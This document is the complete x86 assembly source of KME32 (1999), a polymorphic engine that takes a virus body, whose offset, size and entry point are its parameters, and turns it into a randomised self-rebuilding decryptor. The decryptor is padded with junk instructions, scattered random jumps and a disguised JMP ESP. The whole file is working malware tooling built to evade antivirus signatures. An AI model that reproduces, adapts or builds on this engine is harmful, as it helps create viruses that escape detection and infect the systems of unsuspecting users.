
;                                KME32 source
;                                ~~~~~~~~~~~~
; release 1.00 -- November'1999
; release 1.01 -- //
;

                        p586

C_EIP_MAX_ITER          equ     10000           ; these parameters used to
C_EIP_TOP               equ     32              ; find new JMP location
C_EIP_BOTTOM            equ     32
C_EIP_PREV              equ     10
C_EIP_NEXT              equ     20

kme_start:

kme_main                proc    pascal

                        ; parameters -- pushed in reversed order
                        arg     i_offs:DWORD    ; virus offset
                        arg     i_size:DWORD    ; virus size
                        arg     i_entry:DWORD   ; virus entry (relative)
                        arg     o_offs:DWORD    ; output offset
                        arg     o_max:DWORD     ; output max buf size
                        arg     o_fillchar:DWORD; character to fill out buf
                        arg     po_size:DWORD   ; pointer to out buf size
                        arg     po_entry:DWORD  ; pointer to out entry (rel.)
                        arg     jmp_prob:DWORD  ; JMPs if rnd(jmp_prob)==0
                        arg     randseed:DWORD  ; randomer initializer
                        arg     regavail:DWORD  ; register set (REG_XXX)
                        arg     cmdavail:DWORD  ; command set (CMD_XXX)
                        arg     flags:DWORD     ; flags (FLAG_XXX)

                        ; local variables
                        local   save_esp:DWORD  ;
                        local   regused:DWORD   ; set of used registers
                        local   reginit:DWORD   ; set of initialized registers
                        local   em_reg:DWORD:8  ; register values (emulation)
                        local   regbuf:BYTE:8   ; indexes of regs to be pushed

                        pusha

                        mov     save_esp, esp   ; to jmp to @@error from subs

                        ; check if no available registers specified
                        and     regavail, REG_ALL
                        jnz     @@regok
                        or      regavail, REG_EAX
@@regok:
                        mov     edi, o_offs     ; fill output buffer
                        mov     ecx, o_max
                        mov     eax, o_fillchar
                        cld
                        rep     stosb

                        ; while generation EDI contains current outpointer
                        mov     edi, o_offs

                        ; if need jmps & (not FLAG_EIP0) select random EDI
                        test    flags, FLAG_EIP0+FLAG_NOJMPS
                        jnz     @@skipnew
                        call    @@find_new_eip
@@skipnew:

                        ; calculate decryptor entry point
                        mov     eax, edi
                        sub     eax, o_offs
                        mov     ebx, po_entry
                        mov     [ebx], eax

                        ; initialize bitsets: no registers initialized/used
                        xor     eax, eax
                        mov     reginit, eax
                        mov     regused, eax

                        call    @@int3          ; add INT3 if FLAG_DEBUG

                        ; ECX contains number of elements in regbuf
                        xor     ecx, ecx

                        call    @@poly_cmd      ; add "logic" command

@@main_cycle:           ; main encryption cycle

                        call    @@get_init_reg  ; select/initialize rnd reg
                        xchg    ebx, eax

                        call    @@poly_cmd      ; add "logic" command

                        ; push registers until register in EBX become free
                        call    @@push_uptoebx

                        ; get next dword (backward)
                        mov     edx, i_size
                        add     edx, 3          ; align 4
                        and     edx, not 3
                        sub     edx, 4          ; -4
                        mov     i_size, edx
                        add     edx, i_offs     ; get dword into EDX
                        mov     edx, [edx]

                        call    @@gen_value   ; make em_reg[EBX] equal to EDX

                        bts     regused, ebx    ; mark reg in EBX as used

                        mov     regbuf[ecx], bl ; store EBX as ready to push
                        inc     ecx

                        cmp     i_size, 0       ; until we still have dwords
                        jg      @@main_cycle    ; in inputstream

                        call    @@push_all      ; push all unpused registers

                        call    @@int3          ; add INT3 if FLAG_DEBUG

                        call    @@epilog        ; "epilog" code -- JMP ESP

                        ; calculate size of generated decryptor
                        sub     edi, o_offs
                        test    flags, FLAG_NOJMPS
                        jnz     @@nj
                        mov     edi, o_max
@@nj:                   mov     eax, po_size
                        mov     [eax], edi

                        clc                     ; CF=0 - all ok

@@error_exit:           popa                    ; retore regs & exit
                        ret

                        ; error handler
@@error:                mov     esp, save_esp   ; rest. ESP (if call from sub)
                        stc                     ; CF=1 - an error occured
                        jmp     @@error_exit

; ===================== subroutines =========================================

                        ; add INT3 command (if FLAG_DEBUG)
@@int3:                 test    flags, FLAG_DEBUG
                        jz      @@skip_debug
                        mov     al, 0CCh
                        stosb
@@skip_debug:           retn

; ---------------------------------------------------------------------------

                        ; push 1 register
                        ; (indexes stored in regbuf, count in ECX)

@@push_1:               dec     ecx             ; decr. num of regs in regbuf
                        movzx   eax, regbuf     ; read 1 byte
                        pusha                   ; delete 1st entry in regbuf
                        lea     esi, regbuf+1
                        lea     edi, regbuf
                        movsd                   ; just 8 bytes
                        movsd
                        popa
                        btr     regused, eax    ; mark register as free
                        call    @@eip           ; add JMP
                        add     al, 50h         ; PUSH reg
                        stosb
                        call    @@poly_cmd      ; "logic" command
                        retn

                        ; push all registers
                        ; (indexes stored in regbuf, count in ECX)

@@push_all:             jecxz   @@push_done
                        call    @@push_1
                        jmp     @@push_all
@@push_done:            retn

                        ; push registers up to pointed by EBX
                        ; (indexes stored in regbuf, count in ECX)

@@push_uptoebx:         bt      regused, ebx
                        jnc     @@ebx_free
                        call    @@push_1
                        jmp     @@push_uptoebx
@@ebx_free:             retn

; ===========================================================================

                        ; "epilog" code -- JMP ESP in perverted form

@@epilog:               call    @@poly_cmd      ; "logic"

                        call    @@get_free_reg  ; get free rnd reg <reg1>
                        xchg    ecx, eax

                        bts     regused, ecx    ; mark as used

                        call    @@eip           ; JMP

                        mov     ax, 0E089h      ; mov reg1, esp
                        add     ah, cl
                        stosw

                        call    @@poly_cmd      ; logic

                        mov     eax, regavail   ; used all regs?
                        cmp     regused, eax
                        jne     @@morethan1reg

                        ; if we have only 1 register

@@1reg:                 call    @@eip           ; JMP

                        mov     ax, 0C081h      ; add reg1, i_entry
                        add     ah, cl
                        stosw
                        mov     eax, i_entry
                        stosd

                        jmp     @@1ornot

                        ; if we have more than 1 register

@@morethan1reg:         call    @@get_free_reg  ; get free rnd reg <reg2>
                        xchg    ebx, eax

                        bts     regused, ebx    ; mark as used

                        mov     edx, i_entry    ; reg2 <-- i_entry
                        call    @@gen_value

                        call    @@poly_cmd      ; logic

                        btr     regused, ebx    ; mark reg2 as free

                        call    @@eip           ; JMP

                        mov     ax, 0C001h      ; add reg1, reg2
                        or      ah, cl
                        shl     bl, 3
                        or      ah, bl
                        stosw

@@1ornot:               call    @@poly_cmd      ; logic

                        call    @@eip           ; JMP

                        mov     ax, 0E0FFh      ; JMP <reg1>
                        add     ah, cl
                        stosw

                        call    @@poly_cmd      ; logic (what for?...)

                        retn

; ===========================================================================

                        ; this subroutine makes em_reg[EBX] equal to EDX

@@gen_value:            test    cmdavail, CMD2_XOR+CMD2_ADD+CMD2_SUB
                        jz      @@rdef          ; use XOR if noone specified

@@gen_value_restart:    mov     eax, 3          ; EAX=rnd(3)
                        call    @@rnd_eax

                        jz      @@r0            ; dispatch
                        dec     eax
                        jz      @@r1

@@r2:                   test    cmdavail, CMD2_XOR      ; cmd available?
                        jz      @@gen_value_restart
@@rdef:                 xor     edx, em_reg[ebx*4]      ; emul -- xor reg, c
                        xor     em_reg[ebx*4], edx
                        mov     eax, 35F081h            ; opcodes
                        jmp     @@store_cmd

@@r1:                   test    cmdavail, CMD2_ADD      ; cmd available?
                        jz      @@gen_value_restart
                        sub     edx, em_reg[ebx*4]      ; emul -- add re , c
                        add     em_reg[ebx*4], edx
                        mov     eax, 05C081h            ; opcodes
                        jmp     @@store_cmd

@@r0:                   test    cmdavail, CMD2_SUB      ; cmd available?
                        jz      @@gen_value_restart
                        sub     edx, em_reg[ebx*4]      ; emul -- sub reg, c
                        neg     edx
                        sub     em_reg[ebx*4], edx
                        mov     eax, 2dE881h            ; opcodes

@@store_cmd:            or      edx, edx        ; skip zero-argument
                        jz      @@rt

                        call    @@eip           ; JMP

                        test    flags, FLAG_NOSHORT     ; if skip short opcs
                        jnz     @@long

                        or      ebx, ebx        ; use short form for EAX
                        jnz     @@long
                        shr     eax, 16
;@@short:
                        stosb                   ; store 1-byte opcode
                        jmp     @@shortorlong

@@long:                 add     ah, bl          ; store 2-byte opcode
                        stosw

@@shortorlong:          xchg    edx, eax        ; store argument (EDX)
                        stosd

@@rt:                   retn

; ===================== random number generator =============================

@@random_eax:           mov     eax, randseed   ; standard PASCAL's algorithm
                        imul    eax, 8088405h
                        inc     eax
                        mov     randseed, eax
                        retn

; ---------------------------------------------------------------------------

@@rnd_eax:              push    ebx
                        push    edx
                        mov     ebx, eax
                        call    @@random_eax
                        xor     edx, edx
                        mul     ebx             ; MUL is really kewl
                        mov     eax, edx
                        pop     edx
                        pop     ebx
                        test    eax, eax
                        retn

; ===================== register selection management =======================

@@get_rnd_reg:         ;mov     eax, 8          ; get random register
                       ;call    @@rnd_eax
                        call    @@random_eax
                        shr     eax, 32-3
                        bt      regavail, eax   ; "regavail" set only
                        jnc     @@get_rnd_reg
                        retn

; ---------------------------------------------------------------------------

                        ; get random initialized register
@@get_init_reg:         call    @@get_rnd_reg   ; get random reg
                        call    @@reg_init_eax  ; initialize it (if not yet)
                        retn

; ---------------------------------------------------------------------------

                        ; check register & initialize it if unitinitalized
                        ; used 'coz initially em_reg[0..7] is unknown

@@reg_init_eax:         bts     reginit, eax    ; initialized?
                        jc      @@alredy

                        push    ebx
                        mov     ebx, eax
                        call    @@eip           ; JMP
                        add     al, 0B8h        ; MOV r, c
                        stosb
                        call    @@random_eax
                        mov     em_reg[ebx*4], eax  ; store initial em_reg[]
                        stosd
                        xchg    ebx, eax
                        pop     ebx

@@alredy:               retn

; ---------------------------------------------------------------------------

                        ; get random initialized register marked as "free"
@@get_free_reg:         call    @@get_init_reg
                        bt      regused, eax
                        jc      @@get_free_reg
                        retn

; ===========================================================================

                        ; this subroutine finds new output pointer (in EDI)

@@find_new_eip:         mov     edx, C_EIP_MAX_ITER ; max number of restarts

@@eip_find:             dec     edx             ; error if no free space
                        jz      @@error

                        ; find random location within outbuf
                        mov     eax, o_max
                        sub     eax, C_EIP_TOP+C_EIP_BOTTOM
                        call    @@rnd_eax
                        add     eax, C_EIP_TOP
                        add     eax, o_offs
                        xchg    edi, eax

                        ; scan it -- should be unused
                        mov     ecx, C_EIP_NEXT+C_EIP_PREV
                        mov     eax, o_fillchar
                        repz    scasb
                        jnz     @@eip_find
                        sub     edi, C_EIP_NEXT

                        retn

; ---------------------------------------------------------------------------

                        ; this subroutine called before each command is
                        ; stored to output stream
                        ; it probably adds JMP to new random location

@@eip:                  pusha

                        mov     eax, o_offs     ; check if end of outbuf is
                        add     eax, o_max      ; reached. MUST add jmp then.
                        sub     eax, edi
                        cmp     eax, C_EIP_BOTTOM
                        jb      @@eip_do

                        test    flags, FLAG_NOJMPS  ; no JMPs?
                        jnz     @@skip_njcheck
                        ; using JMPs

                        mov     eax, o_fillchar ; scan following code --
                        mov     ecx, C_EIP_NEXT ; -- it should be unused,
                        push    edi             ; MUST add jmp otherwise
                        repz    scasb
                        pop     edi
                        jnz     @@eip_do
@@skip_njcheck:

                        ; well, here we must not add jmp,
                        ; i.e. we may do it or not

                        test    flags, FLAG_NOJMPS  ; JMPs disabled? -exit
                        jnz     @@eip_done

                        mov     eax, jmp_prob   ; add JMP if rnd(jmp_prob)==0
                        call    @@rnd_eax
                        jnz     @@eip_done

@@eip_do:
                        ; well, here we MUST select new location, or die

                        test    flags, FLAG_NOJMPS ; no JMPs? - error!
                        jnz     @@error

                        mov     al, 0E9h        ; add JMP
                        stosb
                        stosd                   ; space for argument
                        mov     ebx, edi        ; save old position

                        call    @@find_new_eip  ; try to find new location

                        mov     eax, edi        ; link
                        sub     eax, ebx
                        mov     [ebx-4], eax

@@eip_done:             mov     [esp+0*4], edi  ; pushad_edi
                        popa
                        retn

; ===================== "logic" management ==================================

                        ; this subroutine adds "logic" instruction into
                        ; output stream.

@@poly_cmd:             pusha

                        call    @@eip                   ; add JMP if needed

                        test    flags, FLAG_NOLOGIC     ; logic disabled?
                        jnz     @@poly_cmd_exit         ; --exit
                        test    cmdavail, CMD_ALL       ; no avail cmds?
                        jz      @@poly_cmd_exit         ; --exit
                        mov     eax, regavail           ; all avail regs used?
                        cmp     regused, eax
                        je      @@poly_cmd_exit         ; --exit

@@poly_cmd_restart:

REG1                    equ     ebx
REG2                    equ     edx
REG1_8                  equ     bl
REG2_8                  equ     dl
XXX                     equ     ecx                     ; fixed
XXX_8                   equ     cl                      ; fixed

                        call    @@get_free_reg          ; get free reg <reg1>
                        xchg    REG1, eax

                        call    @@get_free_reg          ; get free reg <reg2>
                        xchg    REG2, eax

                        call    @@random_eax            ; get random argument
                        xchg    XXX, eax

                        mov     eax, 50         ; select random command index
                        call    @@rnd_eax

                        ; dispatch
                        jz      @@x_not
                        dec     eax
                        jz      @@x_neg
                        dec     eax
                        jz      @@x_inc
                        dec     eax
                        jz      @@x_dec
                        dec     eax
                        jz      @@x_shl
                        dec     eax
                        jz      @@x_shr
                        dec     eax
                        jz      @@x_rol
                        dec     eax
                        jz      @@x_ror
                        dec     eax
                        jz      @@x_sar
                        dec     eax
                        jz      @@x_mov_c
                        dec     eax
                        jz      @@x_add_c
                        dec     eax
                        jz      @@x_sub_c
                        dec     eax
                        jz      @@x_xor_c
                        dec     eax
                        jz      @@x_and_c
                        dec     eax
                        jz      @@x_or_c
                        dec     eax
                        jz      @@x_rol_c
                        dec     eax
                        jz      @@x_ror_c

                        dec     eax             ; r1, r1
                        jz      @@x_add
                        dec     eax             ;
                        jz      @@x_xor
                        dec     eax             ;
                        jz      @@x_sub

                        dec     eax             ; r1, r2
                        jz      @@x_imul
                        dec     eax             ; r1, r2, c
                        jz      @@x_imul_c

                        dec     eax             ; r1, c
                        jz      @@x_btc_c
                        dec     eax             ;
                        jz      @@x_btr_c
                        dec     eax             ;
                        jz      @@x_bts_c

                        dec     eax             ; r1
                        jz      @@x_bswap

                        ; add other commands if only different regs selected
                        cmp     REG1, REG2      ; r1 == r2 ?
                        je      @@poly_cmd_restart

                        dec     eax
                        jz      @@x_mov
                        dec     eax
                        jz      @@x_xchg
                        dec     eax
                        jz      @@x_and
                        dec     eax
                        jz      @@x_or

                        dec     eax             ; r1, r2, c
                        jz      @@x_shld
                        dec     eax             ; r1, r2, c
                        jz      @@x_shrd

                        dec     eax             ; r1, r2
                        jz      @@x_xadd

@@poly_cmd_exit:        ; exit
                        mov     [esp+0*4], edi          ; pushad_edi
                        popa
                        retn

; --------------------- common subroutines ----------------------------------

@@oralR1_stosb:         or      al, REG1_8
                        stosb
                        jmp     @@poly_cmd_exit

@@orahR1_stosw:         or      ah, REG1_8
                        stosw
                        jmp     @@poly_cmd_exit

@@stosw_modrm:          stosb
                        mov     al, ah
@@stosb_modrm:          stosb
                        call    @@modrm
                        jmp     @@poly_cmd_exit

@@modrm:                mov     al, 0C0h
                        shl     REG2_8, 3
                        or      al, REG2_8
                        or      al, REG1_8
                        stosb
                        retn

@@stosw_modrm_stosbX:   stosw
                        call    @@modrm
                        jmp     @@stosbX

@@stosb_modrm_stosd:    stosb
                        call    @@modrm
                        jmp     @@stosd

@@oralR1_stosb_stosd:   or      al, REG1_8
@@stosb_stosd:          stosb
@@stosd:                xchg    eax, XXX
                        stosd
                        jmp     @@poly_cmd_exit

@@orahR1_stosw_stosd:   or      ah, REG1_8
                        stosw
                        jmp     @@stosd

@@checkshort:           test    flags, FLAG_NOSHORT
                        jnz     @@orahR1_stosw_stosd
                        test    REG1, REG1
                        jnz     @@orahR1_stosw_stosd
                        shr     eax, 16
                        jmp     @@stosb_stosd

@@orahR1_stosw_stosbX:  or      ah, REG1_8
                        stosw
@@stosbX:               mov     al, XXX_8
                        stosb
                        jmp     @@poly_cmd_exit

@@modarg:               and     ecx, 31                 ; if (x==0) x++;
                        cmp     cl, 1
                        adc     cl, 0
                        retn

@@stos3or:              stosw
                        shr     eax, 16
                        or      al, REG1_8
                        mov     ah, XXX_8
                        stosw
                        jmp     @@poly_cmd_exit

; ---------------------------------------------------------------------------

@@x_not:                test    cmdavail, CMD_NOT       ; cmd available?
                        jz      @@poly_cmd_restart
                        not     em_reg[REG1*4]          ; emul -- not r1
                        mov     ax, 0d0f7h              ; opcode
                        jmp     @@orahR1_stosw

@@x_neg:                test    cmdavail, CMD_NEG       ; cmd available?
                        jz      @@poly_cmd_restart
                        neg     em_reg[REG1*4]          ; emul -- neg r1
                        mov     ax, 0d8f7h              ; opcode
                        jmp     @@orahR1_stosw

@@x_inc:                test    cmdavail, CMD_INC       ; cmd available?
                        jz      @@poly_cmd_restart
                        inc     em_reg[REG1*4]          ; emul -- inc r1
                        mov     al, 40h                 ; opcode
                        jmp     @@oralR1_stosb

@@x_dec:                test    cmdavail, CMD_DEC       ; cmd available?
                        jz      @@poly_cmd_restart
                        dec     em_reg[REG1*4]          ; emul -- dec r1
                        mov     al, 48h                 ; opcode
                        jmp     @@oralR1_stosb

@@x_shl:                test    cmdavail, CMD_SHL       ; cmd available?
                        jz      @@poly_cmd_restart
                        shl     em_reg[REG1*4], 1       ; emul -- shl r1, 1
                        mov     ax, 0e0d1h              ; opcode
                        jmp     @@orahR1_stosw

@@x_shr:                test    cmdavail, CMD_SHR       ; cmd available?
                        jz      @@poly_cmd_restart
                        shr     em_reg[REG1*4], 1       ; emul -- shr r1, 1
                        mov     ax, 0e8d1h              ; opcode
                        jmp     @@orahR1_stosw

@@x_rol:                test    cmdavail, CMD_ROL       ; cmd available?
                        jz      @@poly_cmd_restart
                        rol     em_reg[REG1*4], 1       ; emul -- rol r1, 1
                        mov     ax, 0c0d1h              ; opcode
                        jmp     @@orahR1_stosw

@@x_ror:                test    cmdavail, CMD_ROR       ; cmd available?
                        jz      @@poly_cmd_restart
                        ror     em_reg[REG1*4], 1       ; emul -- ror r1, 1
                        mov     ax, 0c8d1h              ; opcode
                        jmp     @@orahR1_stosw

@@x_sar:                test    cmdavail, CMD_SAR       ; cmd available?
                        jz      @@poly_cmd_restart
                        sar     em_reg[REG1*4], 1       ; emul -- sar r1, 1
                        mov     ax, 0f8d1h              ; opcode
                        jmp     @@orahR1_stosw

@@x_xor:                test    cmdavail, CMD_XOR       ; cmd available?
                        jz      @@poly_cmd_restart
                        mov     eax, em_reg[REG2*4]     ; emul -- xor r1, r2
                        xor     em_reg[REG1*4], eax
                        mov     al, 31h                 ; opcode
                        jmp     @@stosb_modrm

@@x_add:                test    cmdavail, CMD_ADD       ; cmd available?
                        jz      @@poly_cmd_restart
                        mov     eax, em_reg[REG2*4]     ; emul -- add r1, r2
                        add     em_reg[REG1*4], eax
                        mov     al, 01h                 ; opcode
                        jmp     @@stosb_modrm

@@x_sub:                test    cmdavail, CMD_SUB       ; cmd available?
                        jz      @@poly_cmd_restart
                        mov     eax, em_reg[REG2*4]     ; emul -- sub r1, r2
                        sub     em_reg[REG1*4], eax
                        mov     al, 29h                 ; opcode
                        jmp     @@stosb_modrm

@@x_mov:                test    cmdavail, CMD_MOV       ; cmd available?
                        jz      @@poly_cmd_restart
                        mov     eax, em_reg[REG2*4]     ; emul -- mov r1, r2
                        mov     em_reg[REG1*4], eax
                        mov     al, 89h                 ; opcode
                        jmp     @@stosb_modrm

@@x_xchg:               test    cmdavail, CMD_XCHG      ; cmd available?
                        jz      @@poly_cmd_restart
                        mov     eax, em_reg[REG1*4]     ; emul -- xchg r1, r2
                        xchg    em_reg[REG2*4], eax
                        mov     em_reg[REG1*4], eax
                        mov     al, 87h                 ; opcode
                        jmp     @@stosb_modrm

@@x_and:                test    cmdavail, CMD_AND       ; cmd available?
                        jz      @@poly_cmd_restart
                        mov     eax, em_reg[REG2*4]     ; emul -- and r1, r2
                        and     em_reg[REG1*4], eax
                        mov     al, 21h                 ; opcode
                        jmp     @@stosb_modrm

@@x_or:                 test    cmdavail, CMD_OR        ; cmd available?
                        jz      @@poly_cmd_restart
                        mov     eax, em_reg[REG2*4]     ; emul -- or r1, r2
                        or      em_reg[REG1*4], eax
                        mov     al, 09h                 ; opcode
                        jmp     @@stosb_modrm

@@x_mov_c:              test    cmdavail, CMD_MOV       ; cmd available?
                        jz      @@poly_cmd_restart
                        mov     em_reg[REG1*4], XXX     ; emul -- mov r1, c
                        mov     al, 0B8h                ; opcode
                        jmp     @@oralR1_stosb_stosd

@@x_add_c:              test    cmdavail, CMD_ADD       ; cmd available?
                        jz      @@poly_cmd_restart
                        add     em_reg[REG1*4], XXX     ; emul -- add r1, c
                        mov     eax, 05C081h
                        jmp     @@checkshort

@@x_sub_c:              test    cmdavail, CMD_SUB       ; cmd available?
                        jz      @@poly_cmd_restart
                        sub     em_reg[REG1*4], XXX     ; emul -- sub r1, c
                        mov     eax, 2DE881h            ; opcode
                        jmp     @@checkshort

@@x_xor_c:              test    cmdavail, CMD_XOR       ; cmd available?
                        jz      @@poly_cmd_restart
                        xor     em_reg[REG1*4], XXX     ; emul -- xor r1, c
                        mov     eax, 35F081h            ; opcode
                        jmp     @@checkshort

@@x_and_c:              test    cmdavail, CMD_AND       ; cmd available?
                        jz      @@poly_cmd_restart
                        and     em_reg[REG1*4], XXX     ; emul -- and r1, c
                        mov     eax, 25E081h            ; opcode
                        jmp     @@checkshort

@@x_or_c:               test    cmdavail, CMD_OR        ; cmd available?
                        jz      @@poly_cmd_restart
                        or      em_reg[REG1*4], XXX     ; emul -- or  r1, c
                        mov     eax, 0DC881h            ; opcode
                        jmp     @@checkshort

@@x_rol_c:              test    cmdavail, CMD_ROL       ; cmd available?
                        jz      @@poly_cmd_restart
                        call    @@modarg                ; modify argument
                        rol     em_reg[REG1*4], cl      ; emul -- rol r1, c
                        mov     ax, 0C0C1h              ; opcode
                        jmp     @@orahR1_stosw_stosbX

@@x_ror_c:              test    cmdavail, CMD_ROR       ; cmd available?
                        jz      @@poly_cmd_restart
                        call    @@modarg                ; modify argument
                        ror     em_reg[REG1*4], cl      ; emul -- ror r1, c
                        mov     ax, 0C8C1h              ; opcode
                        jmp     @@orahR1_stosw_stosbX

@@x_imul:               test    cmdavail, CMD_IMUL      ; cmd available?
                        jz      @@poly_cmd_restart
                        mov     eax, em_reg[REG2*4]     ; emul -- imul r1, r2
                        imul    eax, em_reg[REG1*4]
                        mov     em_reg[REG2*4], eax
;                       xchg    REG1, REG2
                        mov     ax, 0AF0Fh              ; opcode
                        jmp     @@stosw_modrm

@@x_imul_c:             test    cmdavail, CMD_IMUL      ; cmd available?
                        jz      @@poly_cmd_restart
                        mov     eax, em_reg[REG1*4]     ; emul -- imul r1,r2,c
                        imul    eax, XXX
                        mov     em_reg[REG2*4], eax
;                       xchg    REG1, REG2
                        mov     al, 69h                 ; opcode
                        jmp     @@stosb_modrm_stosd

@@x_shld:               test    cmdavail, CMD_SHLD      ; cmd available?
                        jz      @@poly_cmd_restart
                        call    @@modarg                ; modify argument
                        mov     eax, em_reg[REG2*4]     ; emul -- shld r1,r2,c
                        shld    em_reg[REG1*4], eax, cl
                        mov     ax, 0A40Fh              ; opcode
                        jmp     @@stosw_modrm_stosbX

@@x_shrd:               test    cmdavail, CMD_SHRD      ; cmd available?
                        jz      @@poly_cmd_restart
                        call    @@modarg                ; modify argument
                        mov     eax, em_reg[REG2*4]     ; emul -- shrd r1,r2,c
                        shrd    em_reg[REG1*4], eax, cl
                        mov     ax, 0AC0Fh              ; opcode
                        jmp     @@stosw_modrm_stosbX

@@x_btc_c:              test    cmdavail, CMD_BTC       ; cmd available?
                        jz      @@poly_cmd_restart
                        call    @@modarg                ; modify argument
                        btc     em_reg[REG1*4], XXX     ; emul -- btc r1, c
                        mov     eax, 0f8ba0fh           ; opcode
                        jmp     @@stos3or

@@x_btr_c:              test    cmdavail, CMD_BTR       ; cmd available?
                        jz      @@poly_cmd_restart
                        call    @@modarg                ; modify argument
                        btr     em_reg[REG1*4], XXX     ; emul -- btr r1, c
                        mov     eax, 0f0ba0fh           ; opcode
                        jmp     @@stos3or

@@x_bts_c:              test    cmdavail, CMD_BTS       ; cmd available?
                        jz      @@poly_cmd_restart
                        call    @@modarg                ; modify argument
                        bts     em_reg[REG1*4], XXX     ; emul -- bts r1, c
                        mov     eax, 0e8ba0fh           ; opcode
                        jmp     @@stos3or

@@x_bswap:              test    cmdavail, CMD_BSWAP     ; cmd available?
                        jz      @@poly_cmd_restart
                        mov     eax, em_reg[REG1*4]     ; emul -- bswap r1
                        bswap   eax
                        mov     em_reg[REG1*4], eax
                        mov     ax, 0c80fh              ; opcode
                        jmp     @@orahR1_stosw

@@x_xadd:               test    cmdavail, CMD_XADD      ; cmd available?
                        jz      @@poly_cmd_restart
                        mov     eax, em_reg[REG1*4]     ; emul -- xadd r1,r2
                        mov     ecx, em_reg[REG2*4]
                        xadd    eax, ecx
                        mov     em_reg[REG1*4], eax
                        mov     em_reg[REG2*4], ecx
                        mov     ax, 0C10Fh              ; opcode
                        jmp     @@stosw_modrm

; ===========================================================================

kme_main                endp

kme_end:

